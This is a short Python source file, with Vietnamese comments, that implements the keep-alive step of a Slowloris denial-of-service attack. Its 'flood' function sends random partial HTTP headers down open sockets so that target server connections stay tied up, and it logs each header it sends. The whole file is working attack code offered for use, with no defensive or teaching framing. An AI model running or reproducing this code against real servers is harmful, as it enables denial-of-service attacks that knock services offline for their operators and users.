import random
import socket
from typing import Optional
from colorama import Fore as F

def flood(sock: socket.SocketType, header_prefix: Optional[str] = "X-a") -> None:
    """Giữ các kết nối sống trong cuộc tấn công Slowloris.

    Args:
        - sock: Socket cần được giữ kết nối
        - header_prefix: Tiền tố của tiêu đề HTTP để gửi

    Returns:
        None
    """
    try:
        laddr, port = sock.getsockname()
        random_header = random.randint(1, 5000)
        header = f"{header_prefix}: {random_header}"
        sock.send(header.encode("utf-8"))

        header_sent = f"{F.RESET} Header Sent:{F.BLUE} {header} {F.RESET}"
        print(
            f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {F.RESET}|{header_sent} {F.RESET}"
        )
    except (socket.error, OSError) as e:
        print(f"{F.RED}[!] Error: {e}{F.RESET}")
